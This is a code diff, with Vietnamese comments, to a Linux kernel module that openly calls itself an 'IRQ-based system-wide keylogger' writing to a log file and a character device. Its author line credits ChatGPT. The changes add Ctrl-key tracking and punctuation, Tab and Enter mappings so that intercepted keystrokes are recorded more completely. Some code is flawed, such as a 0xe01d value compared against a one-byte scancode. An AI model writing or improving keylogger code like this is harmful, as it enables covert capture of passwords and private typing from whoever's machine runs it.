@@ -40,6 +40,8 @@ static struct file *log_file;
 // Trạng thái phím
 static bool left_shift_pressed = false;
 static bool right_shift_pressed = false;
+static bool left_ctrl_pressed = false;
+static bool right_ctrl_pressed = false;
 static bool caps_lock_active = false;
 
 // Bảng ánh xạ scancode sang ký tự (QWERTY)
@@ -60,6 +62,9 @@ static const struct key_map keymap[] = {
     {0x09, '8', '*'},
     {0x0a, '9', '('},
     {0x0b, '0', ')'},
+    {0x0c, '-', '_'},
+    {0x0d, '=', '+'},
+    {0x0f, '\t', '\t'}, // Tab
     {0x10, 'q', 'Q'},
     {0x11, 'w', 'W'},
     {0x12, 'e', 'E'},
@@ -70,15 +75,21 @@ static const struct key_map keymap[] = {
     {0x17, 'i', 'I'},
     {0x18, 'o', 'O'},
     {0x19, 'p', 'P'},
+    {0x1a, '[', '{'}, // [
+    {0x1b, ']', '}'}, // ]
+    {0x1c, '\n', '\n'}, // Enter
     {0x1e, 'a', 'A'},
     {0x1f, 's', 'S'},
     {0x20, 'd', 'D'},
     {0x21, 'f', 'F'},
     {0x22, 'g', 'G'},
-    {0x23, 'h', 'H'},
+    {0x23,'h', 'H'},
     {0x24, 'j', 'J'},
     {0x25, 'k', 'K'},
     {0x26, 'l', 'L'},
+    {0x27, ';', ':'}, // ;
+    {0x28, '\'', '"'}, // '
+    {0x2b, '\\', '|'}, // 
     {0x2c, 'z', 'Z'},
     {0x2d, 'x', 'X'},
     {0x2e, 'c', 'C'},
@@ -86,8 +97,16 @@ static const struct key_map keymap[] = {
     {0x30, 'b', 'B'},
     {0x31, 'n', 'N'},
     {0x32, 'm', 'M'},
-    {0x39, ' ', ' '},
-    {0x1c, '\n', '\n'},
+    {0x33, ',', '<'}, // ,
+    {0x34, '.', '>'}, // .
+    {0x35, '/', '?'}, // /
+    {0x39, ' ', ' '}, // Space
+    // Phím điều khiển
+    {0x2a, 0, 0}, // Left Shift
+    {0x36, 0, 0}, // Right Shift
+    {0x3a, 0, 0}, // Caps Lock
+    {0x1d, 0, 0}, // Left Ctrl
+    {0xe01d, 0, 0}, // Right Ctrl
     {0, 0, 0} // Kết thúc bảng
 };
 
@@ -96,6 +115,21 @@ static char scancode_to_char(unsigned char scancode) {
 
     for (int i = 0; keymap[i].scancode; i++) {
         if (keymap[i].scancode == scancode) {
+            if (scancode == 0x2a) { // Left Shift
+                return 0;
+            }
+            if (scancode == 0x36) { // Right Shift
+                return 0;
+            }
+            if (scancode == 0x3a) { // Caps Lock
+                return 0;
+            }
+            if (scancode == 0x1d) { // Left Ctrl
+                return 0;
+            }
+            if (scancode == 0xe01d) { // Right Ctrl
+                return 0;
+            }
             if (keymap[i].normal == 0) return 0;
 
             // Kiểm tra xem phím có phải là chữ cái (a-z)
@@ -143,6 +177,16 @@ static irqreturn_t irq_handler(int irq, void *dev_id) {
     }
     if (keycode == 0x36) { // Right Shift
         right_shift_pressed = is_pressed;
+        return IRQ_HANDLED;
+    }
+
+    // Xử lý phím Ctrl
+    if (keycode == 0x1d) { // Left Ctrl
+        left_ctrl_pressed = is_pressed;
+        return IRQ_HANDLED;
+    }
+    if (keycode == 0xe01d) { // Right Ctrl
+        right_ctrl_pressed = is_pressed;
         return IRQ_HANDLED;
     }
 
@@ -258,4 +302,4 @@ module_exit(keylogger_exit);
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("ChatGPT + duckanh");
-MODULE_DESCRIPTION("IRQ-based system-wide keylogger with char device + log file");
+MODULE_DESCRIPTION("IRQ-based system-wide keylogger with char device + log file"); 
